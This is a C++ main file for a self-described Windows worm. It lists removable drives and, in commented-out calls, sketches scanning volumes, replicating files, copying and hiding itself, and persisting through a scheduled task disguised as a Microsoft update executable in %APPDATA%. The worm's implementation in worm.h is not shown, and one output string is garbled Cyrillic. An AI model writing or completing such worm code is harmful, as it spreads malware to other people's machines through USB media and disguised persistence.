#include "worm.h"

int main() {
	
	setlocale(LC_ALL, "Russian");
	worm worm1;
	//worm worm1("E:\\test_worm", 1);
	worm1.worm_was_started();

	cout << "ÑÏÈÑÎÊ ÂÑÅÕ ÂÍÅØÍÈÕ ÍÎÑÈÒÅËÅÉ" << endl;
	for (const auto& a1 : get_removable_volume_paths()) {
		wcout << a1 << endl;
	};
	//worm1.scan_all_volumes();

	
	/*
	worm1.search_list_dir();
	worm1.print_list_dir();
	worm1.collect_visible_files();

	worm1.print_file_to_copy();

	worm1.replicate_files(1);
	*/
	//worm1.copy_and_hide_worm();
	//worm1.create_scheduled_task(L"%APPDATA%\\Microsoft\\Update\\update.exe");
	//worm1.copy_file();
	//wcout<<get_own_path();
}